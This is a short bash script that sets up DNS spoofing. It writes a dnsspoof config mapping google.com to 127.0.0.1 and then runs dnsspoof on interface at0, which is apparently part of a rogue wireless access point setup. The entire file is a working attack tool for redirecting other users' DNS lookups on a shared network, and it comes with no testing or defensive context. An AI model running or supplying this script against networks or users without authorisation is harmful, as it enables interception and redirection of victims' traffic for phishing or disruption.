#! /bin/bash

# setup dns spoofing

# these are the addresses to spoof
# redirect	url
echo "
127.0.0.1	google.com
" > config/dnsspoof.conf

# start the spoofing using dnsspoof.conf addresses
dnsspoof -i at0 -f config/dnsspoof.conf
